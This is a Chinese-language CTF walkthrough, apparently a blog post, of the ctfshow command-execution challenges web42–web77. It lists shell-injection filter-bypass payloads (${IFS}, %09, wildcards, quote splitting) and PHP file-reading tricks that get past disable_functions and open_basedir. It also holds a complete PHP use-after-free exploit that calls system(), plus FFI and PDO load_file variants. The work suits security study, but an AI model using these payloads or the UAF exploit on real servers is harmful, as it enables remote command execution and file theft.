+&amp;&amp; 顺序执行
+|| 前边执行成功则不再执行
+换行符(在url中是%0a)
+&amp; (在url中是%26)
+</code></pre>
+<p>注意，通过url传递&amp;&amp;时要记得urlencode为%26%26，否则会被当作url参数的分隔符而不是shell命令的分隔符。</p>
+<pre><code>payload c=cat flag.php%26
+</code></pre>
+<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>过滤了cat，用tac替换</p>
+<pre><code>paylaod c=tac flag.php%26
+</code></pre>
+<h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><pre><code>payload c=tac f*%26
+</code></pre>
+<h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><p>用%09替换空格</p>
+<pre><code>paylaod c=tac%09f*%26
+</code></pre>
+<p>常见的空格替换</p>
+<pre><code>%09，%20，$IFS、$&#123;IFS&#125;、$IFS$9，&#123;tac,*&#125;，&lt;，&lt;&gt;
+</code></pre>
+<h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><p>过滤了*和数字</p>
+<pre><code>payload c=tac%09fla&#39;&#39;g.php||
+        c=tac%09fl[a-z]g.php||
+</code></pre>
+<p>%09解码后是水平制表符，而不是数字</p>
+<h3 id="web47-49"><a href="#web47-49" class="headerlink" title="web47-49"></a>web47-49</h3><pre><code>payload c=tac%09fla&#39;&#39;g.php||
+</code></pre>
+<h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><p>屏蔽了x09和x26，也就是屏蔽了%09和%26，用其他方式绕过空格,这关用不了[a-z]了</p>
+<pre><code>payload c=tac&lt;&gt;fl\ag.php||
+</code></pre>
+<h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><p>tac被ban了</p>
+<pre><code>payload c=ta&#39;&#39;c&lt;&gt;fla\g.php||
+        c=ta\c&lt;&gt;fla\g.php||
+        c=nl&lt;&gt;fla\g.php||
+</code></pre>
+<h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><p>&lt;&gt;尖括号被过滤了但是$没过滤</p>
+<pre><code>?c=ls$&#123;IFS&#125;../../../||   //flag在根目录
+c=ta\c$&#123;IFS&#125;../../../fl\ag||
+</code></pre>
+<h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><p>多过滤了wget，没影响</p>
+<pre><code>payload ?c=ta\c$&#123;IFS&#125;fla\g.php
+</code></pre>
+<p>注意，这一关没有了黑洞</p>
+<h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><p>1.可以使用grep命令：</p>
+<pre><code>?c=grep$&#123;IFS&#125;ctf$&#123;IFS&#125;fl?g.php
+</code></pre>
+<p>2.可以使用mv命令</p>
+<pre><code>?c=mv$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt  //直接访问a.txt
+</code></pre>
+<ol start="3">
+<li>&#x2F;bin下存放一些普通的基本命令，可以使用通配符去调用命令</li>
+</ol>
+<pre><code>?c=/bin/?at$&#123;IFS&#125;f???????
+</code></pre>
+<h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><p>方法一：通过匹配bin下存在的命令进行读取flag。<br> bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br> 我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是&#x2F;bin&#x2F;ls</p>
+<pre><code>payload ?c=/???/????64 ????.???					//也就是?c=/bin/base64 flag.php
+</code></pre>
+<p>方法二：bzip2的使用</p>
+<pre><code>payload：?c=/???/???/????2 ????.???					//也就是/usr/bin/bzip2 flag.php
+然后访问/flag.php.bz2进行下载获得flag.php
+</code></pre>
+<p>注:<strong>&#x2F;bin</strong> 是所有用户都可以访问并执行的可执行程序。包括超级用户及一般用户。<br>      <strong>&#x2F;usr&#x2F;bin</strong> 是系统安装时自带的一些可执行程序。即系统程序。</p>
+<p>方法三：</p>
+<p>可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php?????[@-[]（上传的文件在linux下面一般保存在&#x2F;tmp&#x2F;php??????一般后面的6个字符是五个小写加一个大写，大写可以通过linux的匹配符去匹配，不过因为是随机生成的大写字母，不一定每次都是大写，可以多试几下。）<br>注意：通过.去执行sh命令不需要有执行权限<br>需要先构造一个post上传文件的数据包。</p>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+ &lt;meta charset=&quot;UTF-8&quot;&gt;
+ &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+ &lt;title&gt;POST数据包POC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;!--链接是当前打开的题目链接--&gt;
+ &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;
+ &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
+ &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>然后抓包并修改文件内容改为shell命令，并且传入c参数：</p>
+<img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/155054.png" class="">
+
+<p>可以看看p神的无字母数字提高篇<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>过滤了数字，使用前一关的第三种方法即可</p>
+<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>这关需要构造出36。</p>
+<p>$(()) 代表做一次运算，因为里面为空，也表示值为0</p>
+<p>$((~$(())))对0作取反运算，值为-1（如果对a按位取反，则得到的结果为-(a+1)）<br>$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2</p>
+<p>写个脚本生成payload:</p>
+<pre><code class="php">data = &quot;$((~$((&quot;+&quot;$((~$(())))&quot;*37+&quot;))))&quot;
+print(data)
+</code></pre>
+<h3 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h3><p>禁用了一些函数，直接读取文件</p>
+<p>首先获取文件路径</p>
+<img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/104435.png" class="">
+
+<pre><code>c=print_r(scandir(dirname(&#39;./&#39;)));
+c=var_dump(scandir(&#39;./&#39;));
+c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;
+c=$a=&quot;glob:///*&quot;;if($b=opendir($a))&#123;while(($file=readdir($b))!==false)&#123;echo $file.&quot;\n&quot;;&#125;&#125;
+c=$a=opendir(&quot;./&quot;); while (($file = readdir($a)) !== false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;
+c=$a=dir(getcwd());while ($file = $a-&gt;read())&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;
+</code></pre>
+<p>php读取文件函数：</p>
+<pre><code>file()			把整个文件读入一个数组中
+readfile()		读取文件
+fpassthru()		读取文件
+highlight_file()	读文件
+show_source()		同上
+base64_decode()		base64解码
+strrev()		反转字符串
+php_strip_whitespace()  返回删除注释和空格后的PHP源码
+file_get_contents()   将整个文件读入一个字符串
+include($filename); // 非php代码
+include_once($filename); // 非php代码
+require($filename); // 非php代码
+require_once($filename); // 非php代码
+
+示例：
+echo file_get_contents(&quot;flag.php&quot;);   
+print_r(file(&#39;flag.php&#39;));
+var_dump(file(&#39;flag.php&#39;));
+include(&#39;flag.php&#39;);echo $flag;
+var_dump(glob(&quot;*flag*&quot;)); // 寻找与模式匹配的文件路径
+include(&#39;flag.php&#39;);var_dump(get_defined_vars()); //get_defined_vars()函数返回由所有已定义变量所组成的数组。
+</code></pre>
+<p>通过fopen读取文件内容</p>
+<pre><code>fread()		
+fread($file,100)     	读取打开的文件，读取100个字节
+fgets()			读取一行
+fgetc()			读取一个字符
+fgetss()
+fgetcsv()		读取一行
+gpassthru()
+
+payload:
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;//一行一行读取
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;//一个一个字符读取
+c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;
+</code></pre>
+<p>也可以通过复制，重命名读取php文件内容</p>
+<pre><code>copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);             
+rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);
+</code></pre>
+<p>还可以直接用蚁剑连接。</p>
+<h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>show_source()被ban了，使用highlight_file()，这次的flag在flag.txt里，先查目录，再进文件。</p>
+<pre><code>c=print_r(scandir(&#39;../../../&#39;));
+c=highlight_file(&#39;../../../flag.txt&#39;);
+</code></pre>
+<h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>print_r被ban了</p>
+<pre><code>c=var_dump(scandir(&#39;../../../&#39;));
+c=highlight_file(&#39;../../../flag.txt&#39;);
+</code></pre>
+<h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>highlight_file()被ban了，但因为flag在txt里，所以可以用include()</p>
+<pre><code>c=var_dump(scandir(&#39;../../../&#39;));
+c=include(&#39;../../../flag.txt&#39;);
+</code></pre>
+<h3 id="web69-70"><a href="#web69-70" class="headerlink" title="web69-70"></a>web69-70</h3><p>print_r()和var_dump()都被ban了，用其他方式读目录</p>
+<pre><code>c=$a=opendir(&#39;./&#39;);while(($file=readdir($a))!==false)&#123;echo $file.“&lt;/br&gt;”;&#125;;
+c=include(&#39;/flag.txt&#39;);
+</code></pre>
+<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>下载附件</p>
+<img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/212130.png" class="">
+
+<pre><code>ob_get_contents — 返回输出缓冲区的内容 
+ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲
+</code></pre>
+<pre><code>payload c=include(&quot;/flag.txt&quot;);exit();
+</code></pre>
+<h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>尝试读取根目录</p>
+<pre><code>c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();
+</code></pre>
+<img src="/2023/04/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(ctfshow)/215446.png" class="">
+
+<p>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。<br> disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空。<br> ini_set()用于设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。但是这题也给ban了。<br> 那么可以使用glob伪协议绕过open_basedir</p>
+<pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();
+</code></pre>
+<p>然后可以看到flag文件名为flag0.txt，但是由于open_basedir的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把c&#x3D;之后的内容url编码：</p>
+<pre><code>c=function ctfshow($cmd) &#123;
+    global $abc, $helper, $backtrace;
+    class Vuln &#123;
+        public $a;
+        public function __destruct() &#123; 
+            global $backtrace; 
+            unset($this-&gt;a);
+            $backtrace = (new Exception)-&gt;getTrace();
+            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
+                $backtrace = debug_backtrace();
+            &#125;
+        &#125;
+    &#125;
+    class Helper &#123;
+        public $a, $b, $c, $d;
+    &#125;
+    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;
+        $address = 0;
+        for($j = $s-1; $j &gt;= 0; $j--) &#123;
+            $address &lt;&lt;= 8;
+            $address |= ord($str[$p+$j]);
+        &#125;
+        return $address;
+    &#125;
+    function ptr2str($ptr, $m = 8) &#123;
+        $out = &quot;&quot;;
+        for ($i=0; $i &lt; $m; $i++) &#123;
+            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
+            $ptr &gt;&gt;= 8;
+        &#125;
+        return $out;
+    &#125;
+    function write(&amp;$str, $p, $v, $n = 8) &#123;
+        $i = 0;
+        for($i = 0; $i &lt; $n; $i++) &#123;
+            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));
+            $v &gt;&gt;= 8;
+        &#125;
+    &#125;
+    function leak($addr, $p = 0, $s = 8) &#123;
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak = strlen($helper-&gt;a);
+        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;
+        return $leak;
+    &#125;
+    function parse_elf($base) &#123;
+        $e_type = leak($base, 0x10, 2);
+        $e_phoff = leak($base, 0x20);
+        $e_phentsize = leak($base, 0x36, 2);
+        $e_phnum = leak($base, 0x38, 2);
+        for($i = 0; $i &lt; $e_phnum; $i++) &#123;
+            $header = $base + $e_phoff + $i * $e_phentsize;
+            $p_type  = leak($header, 0, 4);
+            $p_flags = leak($header, 4, 4);
+            $p_vaddr = leak($header, 0x10);
+            $p_memsz = leak($header, 0x28);
+            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; 
+                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size = $p_memsz;
+            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; 
+                $text_size = $p_memsz;
+            &#125;
+        &#125;
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+        return [$data_addr, $text_size, $data_size];
+    &#125;
+    function get_basic_funcs($base, $elf) &#123;
+        list($data_addr, $text_size, $data_size) = $elf;
+        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;
+            $leak = leak($data_addr, $i * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref = leak($leak);              
+                if($deref != 0x746e6174736e6f63)
+                    continue;
+            &#125; else continue;
+            $leak = leak($data_addr, ($i + 4) * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref = leak($leak);    
+                if($deref != 0x786568326e6962)
+                    continue;
+            &#125; else continue;
+            return $data_addr + $i * 8;
+        &#125;
+    &#125;
+    function get_binary_base($binary_leak) &#123;
+        $base = 0;
+        $start = $binary_leak &amp; 0xfffffffffffff000;
+        for($i = 0; $i &lt; 0x1000; $i++) &#123;
+            $addr = $start - 0x1000 * $i;
+            $leak = leak($addr, 0, 7);
+            if($leak == 0x10102464c457f) &#123;
+                return $addr;
+            &#125;
+        &#125;
+    &#125;
+    function get_system($basic_funcs) &#123;
+        $addr = $basic_funcs;
+        do &#123;
+            $f_entry = leak($addr);
+            $f_name = leak($f_entry, 0, 6);
+            if($f_name == 0x6d6574737973) &#123;
+                return leak($addr + 8);
+            &#125;
+            $addr += 0x20;
+        &#125; while($f_entry != 0);
+        return false;
+    &#125;
+    function trigger_uaf($arg) &#123;
+        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+        $vuln = new Vuln();
+        $vuln-&gt;a = $arg;
+    &#125;
+    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
+        die(&#39;This PoC is for *nix systems only.&#39;);
+    &#125;
+    $n_alloc = 10; 
+    $contiguous = [];
+    for($i = 0; $i &lt; $n_alloc; $i++)
+        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+    trigger_uaf(&#39;x&#39;);
+    $abc = $backtrace[1][&#39;args&#39;][0];
+    $helper = new Helper;
+    $helper-&gt;b = function ($x) &#123; &#125;;
+    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;
+        die(&quot;UAF failed&quot;);
+    &#125;
+    $closure_handlers = str2ptr($abc, 0);
+    $php_heap = str2ptr($abc, 0x58);
+    $abc_addr = $php_heap - 0xc8;
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+    $closure_obj = str2ptr($abc, 0x20);
+    $binary_leak = leak($closure_handlers, 8);
+    if(!($base = get_binary_base($binary_leak))) &#123;
+        die(&quot;Couldn&#39;t determine binary base address&quot;);
+    &#125;
+    if(!($elf = parse_elf($base))) &#123;
+        die(&quot;Couldn&#39;t parse ELF header&quot;);
+    &#125;
+    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;
+        die(&quot;Couldn&#39;t get basic_functions address&quot;);
+    &#125;
+    if(!($zif_system = get_system($basic_funcs))) &#123;
+        die(&quot;Couldn&#39;t get zif_system address&quot;);
+    &#125;
+    $fake_obj_offset = 0xd0;
+    for($i = 0; $i &lt; 0x110; $i += 8) &#123;
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    &#125;
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4); 
+    write($abc, 0xd0 + 0x68, $zif_system); 
+    ($helper-&gt;b)($cmd);
+    exit();
+&#125;
+ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();
+#需要通过url编码哦
+</code></pre>
+<h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><p>扫描目录</p>
+<pre><code>c=$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;exit();
+c=$d=opendir(&quot;../../../&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit(); //跟着别的教程走了半天，最后发现这两关没有被open_basedir限制
+</code></pre>
+<p>直接用include</p>
+<pre><code>c=include(&quot;/flagc.txt&quot;);exit(0);
+c=require(&quot;/flagc.txt&quot;);exit(0);
+</code></pre>
+<h3 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h3><p>直接include()不行了，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag</p>
+<pre><code>c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,
+&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)
+&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-
+&gt;getMessage();exit(0);&#125;exit(0);
+</code></pre>
+<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>看大佬说是要用到使用PHP7.4以上才有的FFI进行命令执行</p>
+<pre><code>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象
+$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的
+$ffi-&gt;system($a);//通过$ffi去调用system函数
+</code></pre>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023-2026 Secfeng
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
